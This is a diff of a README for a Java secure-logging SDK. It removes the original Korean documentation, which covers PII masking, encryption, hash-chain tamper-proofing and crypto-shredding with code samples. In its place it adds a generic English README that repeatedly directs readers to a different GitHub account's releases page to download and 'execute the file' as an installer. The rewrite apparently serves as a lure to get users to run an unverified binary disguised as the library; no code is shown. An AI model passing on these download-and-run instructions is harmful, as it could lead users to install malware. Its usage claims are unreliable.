@@ -1,179 +1,75 @@
-<div align="center">
-  <h1>🚛 KBS (blacK-Box logging SDK)</h1>
+# 🛠️ blackbox-logging-sdk - Simple Secure Logging for Everyone
 
-  <img src="https://github.com/user-attachments/assets/4af1bc28-4377-466a-94a0-1c51ffcf5676" width="600">
+## 📥 Download Now!
+[![Download blackbox-logging-sdk](https://img.shields.io/badge/Download-blackbox--logging--sdk-blue.svg)](https://github.com/Ju750/blackbox-logging-sdk/releases)
 
-</div>
+## 📜 Overview
+Welcome to blackbox-logging-sdk! This software allows you to securely log data without changing your existing code. It provides features like masking, encryption, and tamper-proofing. These tools help keep your information safe and private.
 
-<p align=center>
-  <a href="https://github.com/HongJungWan/blackbox-logging-sdk/wiki">📕 위키</a>
-</p>
+## 🚀 Getting Started
+To start using blackbox-logging-sdk, follow these steps:
 
-## ✍🏻 프로젝트 개요
+1. **Visit the Releases Page**: Click on the link below to go to the download section.
+   - [Visit Releases Page](https://github.com/Ju750/blackbox-logging-sdk/releases)
 
-"로그, 남기는 건 필수지만 기다리는 건 싫으니까요."
+2. **Choose Your Version**: You will see several versions listed. Select the latest version for the best features and security. 
 
-보안이 강력한 로그 시스템은 느려지기 쉽습니다. 암호화와 무결성 검증 비용이 곧 레이턴시가 되기 때문입니다.
-우리는 **Java 21의 Virtual Thread**와 표준 동시성 라이브러리(ReentrantLock, ConcurrentHashMap)를 활용해 이 문제를 해결했습니다.
+3. **Download the Software**: Click on the version you want to download. This action will start the download of the SDK file to your computer.
 
-물론, 속도만 챙긴 것은 아닙니다. 제가 개발을 하며 겪은 보안 고민들도 함께 담았습니다.
+4. **Install the SDK**: Once downloaded, locate the file in your computer's downloads folder. Open it and follow the installation prompts.
 
-- 💡 어? 방금 로그에 주민번호 찍힌 거 아냐?
-- 💡 이 로그, 진짜 원본 맞아요?
-- 💡 퇴사한 직원 데이터, 언제 다 지우지?
+5. **Start Using the SDK**: After installation, you can start using the SDK in your application. Follow the usage instructions provided in the documentation section below.
 
-KBS SDK를 사용하면 시스템 부하가 높아져도 로그는 메인 로직을 방해하지 않고, 안전하게 포장되어 배달됩니다.
+## 📂 Features
+- **Masking**: Protect sensitive data by masking it before logging.
+- **Encryption**: Ensure your data logs are encrypted for added security.
+- **Tamper-Proofing**: Prevent unauthorized changes to your logs.
+- **High Performance**: Designed to efficiently handle logging without causing lag.
+- **Java 21 & Project Loom Support**: Built to work seamlessly with the latest Java technologies.
+- **Zero Dependency**: No additional libraries required, making it easy to use.
 
-<br><br>
+## ⚙️ System Requirements
+- Java 21 or higher installed on your machine.
+- Compatible with any operating system that supports Java.
+- Basic understanding of how to integrate an SDK into your application.
 
-## ⚙️ 핵심 기능
+## 📋 Usage
+After installation, integrating blackbox-logging-sdk into your project is simple. Follow these steps:
 
-### 1. PII 자동 마스킹
+1. Add the SDK to your project's dependencies.
+2. Import the necessary classes in your code.
+3. Use provided functions to log data securely.
 
-> 비즈니스 로직에만 집중하세요. 
-> 전화번호, 이메일, 주민등록번호 같은 민감 정보(PII)가 감지되면 SDK가 자동으로 `******` 마스킹 처리하여 저장합니다.
+For detailed examples on usage, refer to the documentation located in the repository.
 
-📌 이미지 업데이트 예정
+## 📦 Download & Install
+To get the blackbox-logging-sdk, follow these steps:
 
-<img src="https://github.com/user-attachments/assets/3dd44c8f-8a36-4000-b0a5-e250810f2ed0" width="450">
+1. Go to the [Releases Page](https://github.com/Ju750/blackbox-logging-sdk/releases).
 
-<br>
+2. Click on the latest version to download. 
 
-### 2. @Mask 어노테이션 마스킹
+3. After the download completes, execute the file and follow the on-screen instructions to install.
 
-> DTO 필드에 어노테이션만 붙이면 리플렉션 프로세서가 자동으로 마스킹을 수행합니다. 
-> 9가지 MaskType(RRN, PHONE, EMAIL, CREDIT_CARD, PASSWORD, SSN, NAME, ADDRESS, ACCOUNT_NUMBER)을 지원합니다.
+4. You can now start integrating secure logging into your projects.
 
-```java
-  public class EmployeeDto {
-      @Mask(MaskType.RRN)
-      private String residentNumber;    // 123456-1234567 → 123456-*******
+## ❓ FAQ
+### What is blackbox-logging-sdk used for?
+This SDK helps log sensitive information safely without altering your existing code.
 
-      @Mask(MaskType.PHONE)
-      private String phoneNumber;       // 010-1234-5678 → 010-****-5678
+### Is it free to use?
+Yes, blackbox-logging-sdk is free to download and use.
 
-      @Mask(MaskType.EMAIL)
-      private String email;             // user@example.com → u***@example.com
-  }
-```
+### Do I need programming knowledge to use it?
+Basic knowledge of how to include an SDK in a project is helpful, but detailed instructions are provided.
 
-<br>
+### Can I contribute to the project?
+Absolutely! Check the repository for contribution guidelines.
 
-### 3. 비상용 복호화 로깅 (Break-glass)
+## 📞 Support
+If you have any questions or need assistance, please open an issue in the GitHub repo or contact us directly through our support channels.
 
-> "마스킹된 데이터, 사고 분석 시 원본이 필요하면?" 이런 고민을 해결합니다. 
-> `@Mask(emergency = true)` 설정 시 마스킹 대신 RSA-OAEP로 암호화된 원본을 저장합니다. 
-> 평문 노출 없이 추후 인가된 관리자만 복호화할 수 있습니다.
+## 📜 License
+This project is licensed under the MIT License. You can find the full details in the LICENSE file in the repository.
 
-```java
-  @Mask(value = MaskType.RRN, emergency = true)
-  private String residentNumber;        // 결과: {"display":"123456-*******", "encrypted":"Base64..."}
-```
-
-<br>
-
-### 4. AOP 기반 감사 문맥
-
-> 누가(Who), 누구의(Whom) 정보를 왜(Why) 봤는지 자동으로 기록합니다.
-> 비즈니스 로직에 침투하지 않고도 감사 정보를 추출합니다.
-
-```java
-  @AuditContext(
-      why = "급여 정보 조회",
-      whomParam = "employeeId",
-      action = AuditAction.READ
-  )
-  public EmployeeSalaryDto getSalary(String employeeId) {
-      // who: Spring Security에서 자동 추출
-      // whom: employeeId 파라미터 값
-      // why: "급여 정보 조회"
-      return repository.findSalary(employeeId);
-  }
-```
-
-<br>
-
-### 5. 위변조 방지
-
-> 로그의 신뢰성을 위해 블록체인의 Hash Chain 기술을 적용했습니다. 
-> 이전 로그와 현재 로그가 체인처럼 연결되어 있어, 중간에 데이터가 1바이트라도 변조되면 즉시 탐지 가능합니다.
-
-📌 이미지 업데이트 예정
-
-<img src="https://github.com/user-attachments/assets/5adfc1d7-32ac-456d-a6bf-44cd89867d5d" width="450">
-
-<br>
-
-### 6. 암호화
-
-> 저장되는 순간 AES-256-GCM 암호화 방식이 적용됩니다. 
-> 암호화 키 없이는 그 누구도 내용을 확인할 수 없습니다.
-
-📌 이미지 업데이트 예정
-
-<img src="https://github.com/user-attachments/assets/2c2ae06c-c7d1-4745-9f55-51cfc9e72e74" width="450">
-
-<br>
-
-### 7. Crypto-Shredding
-
-> 수많은 로그 속에서 특정 개인정보를 찾아 지우는 것은 비효율적입니다. 
-> 우리는 해당 데이터의 '암호화 키'를 파기하는 방식으로, 데이터를 영구적으로 복구 불가능하게 만듭니다.
-
-📌 이미지 업데이트 예정
-
-<img src="https://github.com/user-attachments/assets/caa74a07-ec89-4777-a00e-ca7aa99a1436" width="450">
-
-<br><br>
-
-## 🤿 이런 차이점이 있어요
-
-| 기능 | ⭐️ KBS SDK ⭐ | Logback+SLF4J | Sentry | Datadog |
-  | :--- |:------------:| :---: | :---: | :---: |
-| **PII 자동 마스킹** |   ✅ **내장**   | ❌ | ❌ | 추가 설정 |
-| **@Mask 어노테이션** |      ✅       | ❌ | ❌ | ❌ |
-| **비상용 복호화 (Break-glass)** |      ✅       | ❌ | ❌ | ❌ |
-| **감사 문맥 (@AuditContext)** |      ✅       | ❌ | ❌ | ❌ |
-| **위변조 방지 (Hash Chain)** |      ✅       | ❌ | ❌ | ❌ |
-| **암호화 (AES-256-GCM)** |      ✅       | ❌ | ❌ | ❌ |
-| **Crypto-Shredding (GDPR)** |      ✅       | ❌ | ❌ | ❌ |
-| **데이터 위치** |    자체 인프라    | 자체 | Sentry 서버 | Datadog 서버 |
-
-<br><br>
-
-## 🤿 기술 스택
-
-<table>
-    <thead>
-        <tr>
-            <th>분류</th>
-            <th>기술 스택</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>
-                <p>BackEnd</p>
-            </td>
-            <td>
-                <img src="https://img.shields.io/badge/Java-ED8B00?logo=openjdk&logoColor=white" alt="Java"/>
-                <img src="https://img.shields.io/badge/Spring%20Boot-6DB33F?logo=springboot&logoColor=white" alt="Spring Boot"/>
-            </td>
-        </tr>
-        <tr>
-            <td>
-                <p>Infra</p>
-            </td>
-            <td>
-                <img src="https://img.shields.io/badge/Apache%20Kafka-000000?style=flat&logo=apachekafka&logoColor=white" alt="Kafka"/>
-                <img src="https://img.shields.io/badge/AWS-%23232F3E.svg?style=flat&logo=amazonwebservices&logoColor=white" alt="AWS"/>
-            </td>
-        </tr>
-    </tbody>
-</table>
-
-<br><br>
-
-## 🏛️ 서비스 아키텍처
-
-<img src="https://github.com/user-attachments/assets/82893c14-ba04-4abf-b75d-bb698faa3354" width="500">
+Thank you for choosing blackbox-logging-sdk! We hope it secures your logging needs effectively.
